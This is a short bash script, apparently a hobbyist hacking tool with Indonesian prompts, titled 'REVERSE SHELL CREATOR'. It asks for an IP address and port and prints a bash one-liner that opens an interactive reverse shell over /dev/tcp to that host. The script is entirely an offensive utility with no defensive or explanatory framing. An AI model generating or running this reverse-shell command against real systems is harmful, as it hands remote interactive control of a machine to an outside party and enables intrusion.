#!/bin/bash
echo "🌀 REVERSE SHELL CREATOR"
read -p "IP kamu: " ip
read -p "Port: " port
echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
